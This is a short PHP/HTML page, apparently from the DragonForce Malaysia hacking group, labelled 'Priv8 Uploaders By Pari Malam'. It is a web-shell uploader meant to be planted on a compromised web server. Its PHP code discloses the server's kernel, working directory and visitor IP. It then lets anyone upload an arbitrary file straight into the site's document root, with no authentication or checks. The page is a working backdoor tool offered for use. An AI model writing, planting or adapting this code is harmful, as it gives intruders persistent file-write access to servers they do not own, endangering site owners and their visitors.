<!DOCTYPE html>
<html lang="en">
    <title>Supp Bruhh?</title>
<head>
		<link rel="shortcut icon" href="http://amritresort.in/tikus.gif"> 
        <link rel="icon" type="image/png" href="https://mambang-edge.dragonforce.io/data/assets/logo/32x32-01.png" sizes="32x32" />
        <link rel="apple-touch-icon" href="https://mambang-edge.dragonforce.io/data/assets/logo/maskable_icon_x192.png">
        <meta property="og:site_name" content="Dragon Force Malaysia" />
        <meta property="og:title" content="Pari Malam" />
        <meta property="og:description" content="w00t! w00t!">  
        <meta property="og:image" content="http://amritresort.in/tikus.gif">
        <meta http-equiv="Content-Type" content="text/html; charset=gb2312">
        <meta name="keywords" content="DragonForce Malaysia" />
        <meta name="author" content="Pari Malam" />
		<meta name=googlebot content="all,index,follow">
		<meta name=allow-search content="yes">
		<meta name=audience content="all">
  		<meta name="robots" content="index, follow"> 
  		<meta name="viewport" content="width=device-width, initial-scale=1.0"> 
  		<meta content="text/html; charset=UTF-8" http-equiv="Content-Type"> 
        <meta content='IE=edge,chrome=1' http-equiv='X-UA-Compatible'/>


<style type="text/css">
html {
	text-align: center;
}
a {
	text-decoration: none;
	color: white;
}
</style>
<body bgcolor="black">
<center><br><img src="https://mambang-edge.dragonforce.io/data/assets/logo/maskable_icon_x192.png" width="250" height="250"><center><br>
<font face= "Courier New">
<font color='red' face='Courier New' font size="4px">Priv8 Uploaders By Pari Malam</font></b><center><br>
<?php
echo '<big><font color="white" size="4px"> Kernel: <span style="color: yellow;">'.php_uname().'</font></span></big><br>';
echo '<big><font color="white" size="4px"> Directory: <span style="color: yellow;">'.getcwd().'</font></span></big><br>';
echo "<big><font color='white' size='4px'> Ur Noob IP Address: <span style='color: yellow;'>".$_SERVER['REMOTE_ADDR']."</big></font><br><br>";
echo "<form method='post' enctype='multipart/form-data'>
	  <input type='file' name='just_file'>
	  <input type='submit' name='upload' value='w00t!'>
	  </form>
	  </center>";
$root = $_SERVER['DOCUMENT_ROOT'];
$files = $_FILES['just_file']['name'];
$dest = $root.'/'.$files;
if(isset($_POST['upload'])) {
	if(is_writable($root)) {
		if(@copy($_FILES['just_file']['tmp_name'], $dest)) {
			$web = "http://".$_SERVER['HTTP_HOST']."/";
			echo "<font color='lime'w00t! => <a href='$web$files' target='_blank'><br><b><u>$web/$files</u></b></a></br>";
		} else {
			echo "<font color='red'Failed!";
		}
	} else {
		if(@copy($_FILES['just_file']['tmp_name'], $files)) {
			echo "w00t! => <b>$files</b>";
		} else {
			echo "Failed!";
		}
	}
}
?>
</body>
<br>
<body style="background-image: url('http://37.media.tumblr.com/tumblr_lnsltuqkgo1qfn9vko1_500.gif'); background-repeat: no-repeat; background-size: 100% 100%; background-position: center; background-attachment: fixed; oncontextmenu="return false;" onkeydown="return false;" onmousedown="return false;" onclick="document.getElementById('lagu').play();fs()" id="body">
<video autoplay loop allowscriptaccess='always' allowfullscreen='false' width='1' height='0' >
<audio src="http://cancerinfotw.org/images/liyakun.mp3" autoplay="true" id="lagu" loop=""></audio>

</html>
